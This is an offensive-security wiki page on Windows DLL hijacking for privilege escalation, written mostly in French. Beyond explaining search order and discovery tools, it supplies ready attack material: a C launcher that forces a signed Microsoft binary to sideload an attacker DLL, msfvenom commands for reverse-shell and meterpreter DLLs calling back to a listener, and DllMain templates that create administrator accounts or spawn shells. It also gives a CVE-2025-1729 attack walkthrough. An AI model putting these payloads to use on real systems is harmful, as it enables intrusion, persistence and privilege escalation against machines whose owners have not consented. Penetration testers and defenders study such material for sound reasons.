# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

DLL Hijacking consiste à manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour l'exécution de code, l'obtention de persistence, et, moins fréquemment, la privilege escalation. Malgré l'accent mis ici sur l'escalation, la méthode de hijacking reste la même quel que soit l'objectif.

### Techniques courantes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune avec son efficacité selon la stratégie de chargement des DLL de l'application :

1. **DLL Replacement** : Remplacer une DLL légitime par une malveillante, éventuellement en utilisant DLL Proxying pour préserver la fonctionnalité de la DLL originale.
2. **DLL Search Order Hijacking** : Placer la DLL malveillante dans un chemin de recherche situé avant celui de la DLL légitime, en exploitant le schéma de recherche de l'application.
3. **Phantom DLL Hijacking** : Créer une DLL malveillante pour qu'une application la charge en pensant qu'il s'agit d'une DLL requise inexistante.
4. **DLL Redirection** : Modifier des paramètres de recherche comme %PATH% ou les fichiers .exe.manifest / .exe.local pour rediriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : Substituer la DLL légitime par une version malveillante dans le répertoire WinSxS, méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques Binary Proxy Execution.

## Finding missing Dlls

La manière la plus courante de trouver des DLL manquantes sur un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **configurant** les **2 filtres suivants** :

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

et afficher simplement l'**Activité du système de fichiers** :

![](<../../../images/image (153).png>)

Si vous recherchez des **DLL manquantes en général**, laissez ceci tourner pendant quelques **secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, vous devriez ajouter **un autre filtre comme "Process Name" "contains" "\<exec name>"**, exécuter l'exécutable, puis arrêter la capture des événements.

## Exploiting Missing Dlls

Pour escalader les privilèges, la meilleure chance est de pouvoir **écrire une DLL qu'un processus privilégié tentera de charger** dans un des **emplacements où elle va être recherchée**. Par conséquent, nous pourrons **écrire** une DLL dans un **dossier** où la **DLL est recherchée avant** celui contenant la **DLL originale** (cas étrange), ou nous pourrons **écrire dans un dossier où la DLL va être recherchée** alors que la DLL originale n'existe pas dans aucun dossier.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Les applications Windows recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, dans un ordre particulier. Le problème de DLL hijacking survient lorsqu'une DLL malveillante est placée stratégiquement dans l'un de ces répertoires, de sorte qu'elle est chargée avant la DLL authentique. Une solution pour empêcher cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle référence les DLL dont elle a besoin.

Vous pouvez voir l'**ordre de recherche des DLL sur les systèmes 32-bit** ci-dessous :

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ceci est l'ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la à 0 (par défaut activé).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'**une dll peut être chargée en indiquant le chemin absolu plutôt que juste le nom**. Dans ce cas, cette dll **ne sera recherchée que dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si la dll venait d'être chargée par nom).

Il existe d'autres moyens d'altérer l'ordre de recherche mais je ne vais pas les expliquer ici.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une manière avancée d'influencer de façon déterministe le chemin de recherche des DLL d'un processus nouvellement créé est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l'attaquant, un processus cible qui résout une DLL importée par nom (pas de chemin absolu et sans les flags de chargement sûr) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Idée clé
- Construire les paramètres du processus avec RtlCreateProcessParametersEx et fournir un DllPath personnalisé qui pointe vers votre dossier contrôlé (par ex., le répertoire où se trouve votre dropper/unpacker).
- Créer le processus avec RtlCreateUserProcess. Quand le binaire cible résout une DLL par nom, le loader consultera ce DllPath fourni lors de la résolution, permettant un sideloading fiable même lorsque la DLL malveillante n'est pas colocalisée avec l'EXE cible.

Remarques/limitations
- Cela affecte le processus enfant créé ; c'est différent de SetDllDirectory, qui n'affecte que le processus courant.
- La cible doit importer ou appeler LoadLibrary sur une DLL par nom (pas de chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et les chemins absolus codés en dur ne peuvent pas être détournés. Les exports forwarded et SxS peuvent modifier la précédence.

Exemple C minimal (ntdll, chaînes larges, gestion d'erreurs simplifiée):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Lorsqu'une **DLL qui partage son nom avec une DLL déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. À la place, il effectue une vérification de redirection et un manifeste avant de revenir à la DLL déjà en mémoire. **Dans ce scénario, le système n'effectue pas de recherche pour la DLL**.
- Dans les cas où la DLL est reconnue comme une **known DLL** pour la version actuelle de Windows, le système utilisera sa version de la known DLL, ainsi que toutes ses DLL dépendantes, **en évitant le processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces known DLLs.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **module names**, indépendamment du fait que la DLL initiale ait été identifiée via un chemin complet.

### Escalating Privileges

**Requirements**:

- Identifier un processus qui fonctionne ou fonctionnera avec des **privilèges différents** (horizontal or lateral movement), et qui **ne possède pas de DLL**.
- S'assurer qu'un **accès en écriture** est disponible pour tout **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l'exécutable ou un répertoire présent dans le chemin système.

Oui, les prérequis sont compliqués à trouver car **par défaut c'est un peu étrange de trouver un exécutable privilégié sans dll** et il est encore **plus étrange d'avoir des permissions d'écriture sur un dossier du chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés cela est possible.\
Dans le cas où vous avez la chance de répondre aux conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est bypass UAC**, vous y trouverez peut‑être un **PoC** d'un Dll hijaking pour la version de Windows que vous pouvez utiliser (probablement en changeant simplement le chemin du dossier où vous avez des permissions d'écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers contenus dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez aussi vérifier les imports d'un exécutable et les exports d'une dll avec :
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur comment **abuse Dll Hijacking to escalate privileges** avec permissions pour écrire dans un **System Path folder** consultez :


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur n'importe quel dossier à l'intérieur du system PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont **PowerSploit functions** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll_.

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès sera de **créer une dll qui exporte au minimum toutes les fonctions que l'exécutable importera depuis celle-ci**. Quoi qu'il en soit, notez que Dll Hijacking est utile pour [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une dll valide** dans cette étude sur dll hijacking axée sur dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante** vous pouvez trouver quelques **codes dll basiques** qui pourraient être utiles comme **modèles** ou pour créer une **dll exportant des fonctions non requises**.

## **Créer et compiler des Dlls**

### **Dll Proxifying**

Fondamentalement, un **Dll proxy** est une Dll capable de **exécuter votre code malveillant lorsqu'elle est chargée** mais aussi d'**exposer** et de **fonctionner** comme **attendu** en **retransmettant tous les appels vers la bibliothèque réelle**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous voulez proxify et **générer un proxified dll** ou **indiquer la Dll** et **générer un proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86, je n'ai pas vu de version x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Le vôtre

Notez que dans plusieurs cas la Dll que vous compilez doit **exporter plusieurs fonctions** qui seront chargées par le processus victime ; si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploit échouera**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flux d'attaque

1. En tant qu'utilisateur standard, déposer `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendre que la tâche planifiée s'exécute à 9h30 dans le contexte de l'utilisateur courant.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec une intégrité moyenne.
4. Enchaîner des techniques standard de contournement de l'UAC pour passer de l'intégrité moyenne aux privilèges SYSTEM.

### Atténuation

Lenovo a publié la version UWP **1.12.54.0** via le Microsoft Store, qui installe TPQMAssistant sous `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, supprime la tâche planifiée vulnérable et désinstalle les composants Win32 hérités.

## Références

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
